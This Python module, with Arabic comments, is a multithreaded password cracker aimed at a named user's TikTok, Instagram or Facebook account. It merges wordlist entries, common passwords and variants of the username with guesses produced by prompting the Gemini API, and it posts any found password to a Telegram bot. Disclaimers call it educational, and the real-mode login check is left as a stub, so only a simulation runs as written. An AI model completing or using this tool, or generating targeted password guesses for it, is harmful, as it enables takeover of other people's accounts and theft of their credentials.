import os
import random
import string
import time
import threading
import requests
from colorama import Fore, Style, init
from config import GEMINI_API_KEY, REPORTS_DIR

init(autoreset=True)

# تحذير: هذه الوحدة لأغراض تعليمية فقط.
# الاستخدام غير القانوني محظور.

class PasswordCracker:
    def __init__(self, platform, target_username, wordlist_path=None, use_ai=True, 
                 attack_type="dictionary", threads=5, simulation=True, bot_token=None, chat_id=None):
        self.platform = platform.lower()
        self.target_username = target_username
        self.wordlist_path = wordlist_path
        self.use_ai = use_ai
        self.attack_type = attack_type  # dictionary, bruteforce, ai
        self.threads = threads
        self.simulation = simulation  # وضع المحاكاة: لا يتم إرسال طلبات حقيقية
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.found_password = None
        self.attempts = 0
        self.running = False
        self.lock = threading.Lock()
        self.start_time = None
        self.total_passwords = 0

    def load_wordlist(self):
        """تحميل كلمات السر من ملف"""
        passwords = []
        if self.wordlist_path and os.path.exists(self.wordlist_path):
            try:
                with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        pwd = line.strip()
                        if pwd:
                            passwords.append(pwd)
                print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords from wordlist." + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[-] Error reading wordlist: {e}" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "[-] No wordlist provided or file not found." + Style.RESET_ALL)
        return passwords

    def generate_ai_passwords(self, count=50):
        """توليد كلمات سر باستخدام الذكاء الاصطناعي"""
        if not GEMINI_API_KEY:
            print(Fore.RED + "[!] Gemini API key not set. AI generation disabled." + Style.RESET_ALL)
            return []

        if not self.use_ai:
            return []

        print(Fore.CYAN + "[*] Generating AI passwords..." + Style.RESET_ALL)
        prompt = f"Generate {count} possible passwords for a social media account ({self.platform}) with username '{self.target_username}'. Make them realistic, diverse, and include common variations. Return only the passwords, one per line, no extra text."
        try:
            url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
            headers = {"Content-Type": "application/json"}
            data = {
                "contents": [{
                    "parts": [{"text": prompt}]
                }]
            }
            response = requests.post(url, json=data, headers=headers, timeout=20)
            if response.status_code == 200:
                result = response.json()
                text = result['candidates'][0]['content']['parts'][0]['text']
                passwords = [line.strip() for line in text.split('\n') if line.strip()]
                print(Fore.GREEN + f"[+] AI generated {len(passwords)} passwords." + Style.RESET_ALL)
                return passwords
            else:
                print(Fore.RED + f"[-] AI error: {response.status_code}" + Style.RESET_ALL)
                return []
        except Exception as e:
            print(Fore.RED + f"[-] AI exception: {e}" + Style.RESET_ALL)
            return []

    def generate_bruteforce_passwords(self, min_len=4, max_len=8, chars=None):
        """توليد كلمات سر للهجوم العمياء (محاكاة فقط) - في الواقع هذا غير عملي للعدد الكبير"""
        if chars is None:
            chars = string.ascii_lowercase + string.digits
        # هذا مجرد مثال صغير جداً للمحاكاة
        common = ["123456", "password", "qwerty", "admin", "welcome", "abc123", "letmein"]
        return common

    def try_password(self, password):
        """محاكاة محاولة تسجيل الدخول (تعليمية)"""
        # هنا يمكن إضافة كود حقيقي للتحقق عبر API المنصة إذا كان simulation=False
        # لكن للتعليم، نستخدم كلمات شائعة لمحاكاة النجاح
        common_passwords = [
            "123456", "password", "qwerty", "admin", "welcome", "abc123", "letmein",
            self.target_username.lower(), self.target_username + "123", self.target_username + "!",
            self.target_username.upper(), self.target_username.capitalize()
        ]
        if self.simulation:
            # في وضع المحاكاة، نعتبر الكلمات الشائعة فقط هي التي تنجح
            return password in common_passwords
        else:
            # في الوضع الحقيقي (للاستخدام على أنظمتك الخاصة)، يمكنك إضافة كود حقيقي هنا
            # لكن هذا غير موصى به للاستخدام على حسابات الآخرين
            return False

    def worker(self, passwords, thread_id):
        """دالة العامل لكل خيط"""
        for pwd in passwords:
            if not self.running:
                break
            with self.lock:
                self.attempts += 1
            if self.try_password(pwd):
                with self.lock:
                    self.found_password = pwd
                self.running = False
                break

    def display_stats(self):
        """عرض إحصائيات حية"""
        while self.running:
            elapsed = time.time() - self.start_time
            rate = self.attempts / elapsed if elapsed > 0 else 0
            remaining = (self.total_passwords - self.attempts) / rate if rate > 0 else 0
            print(Fore.CYAN + f"\r[*] Attempts: {self.attempts} | Speed: {rate:.1f} p/s | Est. remaining: {remaining:.1f}s" + Style.RESET_ALL, end='')
            time.sleep(0.5)

    def crack(self):
        """بدء عملية التخمين"""
        self.running = True
        self.start_time = time.time()
        all_passwords = set()

        # جمع كلمات السر حسب نوع الهجوم
        if self.attack_type == "dictionary" or self.attack_type == "ai":
            wordlist_pass = self.load_wordlist()
            all_passwords.update(wordlist_pass)

        if self.attack_type == "ai" and self.use_ai:
            ai_pass = self.generate_ai_passwords(100)
            all_passwords.update(ai_pass)

        if self.attack_type == "bruteforce":
            # في الواقع، القوة العمياء تحتاج إلى توليد عدد هائل من الكلمات
            # هنا نستخدم مجموعة صغيرة للمحاكاة
            bruteforce_pass = self.generate_bruteforce_passwords()
            all_passwords.update(bruteforce_pass)

        # إضافة بعض الكلمات الذكية دائماً
        smart_passwords = [
            self.target_username + "123",
            self.target_username + "!",
            self.target_username.lower(),
            self.target_username.upper(),
            self.target_username.capitalize(),
            "password123",
            "qwerty123",
            "12345678",
            "iloveyou",
            "admin",
            "welcome",
            "monkey",
            "dragon",
            "sunshine",
            "princess",
            "football",
            "superman"
        ]
        all_passwords.update(smart_passwords)

        all_passwords = list(all_passwords)
        random.shuffle(all_passwords)
        self.total_passwords = len(all_passwords)

        print(Fore.YELLOW + f"[*] Starting password cracking for {self.platform} user '{self.target_username}'" + Style.RESET_ALL)
        print(Fore.CYAN + f"[*] Attack type: {self.attack_type.upper()}" + Style.RESET_ALL)
        print(Fore.CYAN + f"[*] Total passwords to try: {self.total_passwords}" + Style.RESET_ALL)
        print(Fore.CYAN + f"[*] Simulation mode: {'ON' if self.simulation else 'OFF'}" + Style.RESET_ALL)
        if not self.simulation:
            print(Fore.RED + "⚠️  Real attack mode: Use only on your own systems!" + Style.RESET_ALL)

        # تقسيم العمل على الخيوط
        chunk_size = max(1, len(all_passwords) // self.threads)
        threads = []
        for i in range(self.threads):
            start = i * chunk_size
            end = (i+1) * chunk_size if i < self.threads-1 else len(all_passwords)
            t = threading.Thread(target=self.worker, args=(all_passwords[start:end], i))
            t.start()
            threads.append(t)

        # تشغيل إحصائيات حية
        stats_thread = threading.Thread(target=self.display_stats, daemon=True)
        stats_thread.start()

        # انتظار انتهاء الخيوط
        for t in threads:
            t.join()

        self.running = False
        print("\n")  # سطر جديد بعد الإحصائيات

        if self.found_password:
            print(Fore.GREEN + f"[+] Password found: {self.found_password} after {self.attempts} attempts!" + Style.RESET_ALL)
            if self.bot_token and self.chat_id:
                message = f"🔓 Password Found!\nPlatform: {self.platform}\nUsername: {self.target_username}\nPassword: {self.found_password}\nAttempts: {self.attempts}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7"
                requests.post(f"https://api.telegram.org/bot{self.bot_token}/sendMessage", json={"chat_id": self.chat_id, "text": message})
        else:
            print(Fore.RED + "[-] Password not found." + Style.RESET_ALL)

        return self.found_password

    def stop(self):
        self.running = False

def main():
    print(Fore.RED + "⚠️  WARNING: This module is for educational purposes only!" + Style.RESET_ALL)
    print(Fore.RED + "⚠️  Unauthorized use against accounts you do not own is illegal." + Style.RESET_ALL)

    platform = input(Fore.MAGENTA + "Enter platform (tiktok/instagram/facebook): ").strip().lower()
    if platform not in ["tiktok", "instagram", "facebook"]:
        print(Fore.RED + "Invalid platform.")
        return

    username = input(Fore.MAGENTA + "Enter target username: ").strip()
    if not username:
        print(Fore.RED + "Username required.")
        return

    wordlist = input(Fore.MAGENTA + "Enter path to wordlist file (leave blank to skip): ").strip()
    if wordlist and not os.path.exists(wordlist):
        print(Fore.RED + "Wordlist file not found. Skipping.")
        wordlist = None

    use_ai = input(Fore.MAGENTA + "Use AI to generate passwords? (y/n): ").strip().lower() == 'y'

    print(Fore.CYAN + "\nAttack types:")
    print("1. Dictionary (using wordlist)")
    print("2. Brute Force (simulated)")
    print("3. AI + Dictionary")
    attack_choice = input(Fore.MAGENTA + "Choose attack type (1/2/3): ").strip()
    if attack_choice == '1':
        attack_type = "dictionary"
    elif attack_choice == '2':
        attack_type = "bruteforce"
    elif attack_choice == '3':
        attack_type = "ai"
    else:
        print(Fore.RED + "Invalid choice. Using dictionary.")
        attack_type = "dictionary"

    try:
        threads = int(input(Fore.MAGENTA + "Number of threads (1-20, default 5): ") or "5")
        if threads < 1:
            threads = 1
        if threads > 20:
            threads = 20
    except:
        threads = 5

    simulation = input(Fore.MAGENTA + "Simulation mode? (y/n, default y): ").strip().lower() != 'n'

    bot_token = input(Fore.MAGENTA + "Enter Telegram bot token (optional, for results): ").strip()
    chat_id = input(Fore.MAGENTA + "Enter Telegram chat ID (optional): ").strip()

    cracker = PasswordCracker(
        platform=platform,
        target_username=username,
        wordlist_path=wordlist,
        use_ai=use_ai,
        attack_type=attack_type,
        threads=threads,
        simulation=simulation,
        bot_token=bot_token,
        chat_id=chat_id
    )
    try:
        cracker.crack()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Stopped by user." + Style.RESET_ALL)
        cracker.stop()

    input(Fore.CYAN + "\nPress Enter to continue..." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
